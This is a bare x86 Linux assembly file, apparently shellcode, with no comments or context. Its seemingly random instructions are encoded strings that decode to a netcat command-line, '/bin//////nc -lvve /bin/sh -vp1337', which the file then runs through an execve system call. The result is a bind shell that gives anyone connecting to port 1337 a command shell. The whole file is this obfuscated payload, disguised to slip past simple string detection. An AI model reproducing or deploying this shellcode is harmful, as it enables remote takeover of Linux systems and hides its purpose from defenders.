global _start

section .text
_start:

xor eax, eax
cdq

call $+ 0xf
sub    eax,0x33317076
xor    esi,DWORD [edi]
aaa
add    byte [eax], al
pop edx

call $ + 0x13
sub   eax,0x6576766c
das
bound  ebp, [ecx+0x6e]
das
jae $+0x6a
add    byte [eax], al
pop ecx

call $ + 0x12
das
bound  ebp, [ecx+0x6e]
das
das
das
das
das
das
outsb
arpl word [eax],ax
pop ebx

push eax
push edx
push ecx
push ebx

mov eax, 0x454e4a2f
;add ax, 0x1000

xor edx,edx
mov  ecx,esp
and eax,0x3a31358b
int 0x80